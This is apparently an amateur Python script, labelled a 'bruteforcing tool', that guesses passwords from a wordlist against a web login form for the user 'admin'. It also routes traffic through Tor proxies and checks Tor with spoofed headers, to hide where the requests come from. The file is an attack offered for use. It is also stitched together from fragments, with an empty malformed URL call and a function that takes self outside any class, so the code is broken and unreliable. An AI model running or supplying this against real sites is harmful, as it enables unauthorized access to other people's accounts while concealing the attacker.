import requests
from pip._vendor.distlib.compat import raw_input



print("this is a bruteforcing tool")

target_url = raw_input("enter the target website for bruteforcing: ")


#variable for storing the passwords
password_list = raw_input("enter the path of the password list: ")



#data dict for taking the values for the input function specifying for each parameter

data_dict = {"username": "admin", "password": " ", "Login": "submit"}


#sending the post requests to the target website

#showing the html code for the target page



with open(password_list, "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data= data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password -->" + word)
            exit()


print("[+] Reached end of line")

# proxies section and connection within tor network

session = requests.session()
session.proxies = {}
session.proxies['http'] = 'socks5h://localhost:9050'
session.proxies['https'] = 'socks5h://localhost:9050'


r = session.get(‘')
print(r.text)

#function for checking tor is configured correctly
def checkTor(self):
		isConfigured = False
		if self.useTor:
			self.setupTOR()
		if self.proxies:
			try:
				response = requests.get('https://check.torproject.org/',headers=self.getSpoofedHeaders(),proxies=self.proxies)
				if self.CHECK_TOR_REGEX.search(response.text):
					isConfigured = True
			except Exception as e:
				print(e)
		return isConfigured
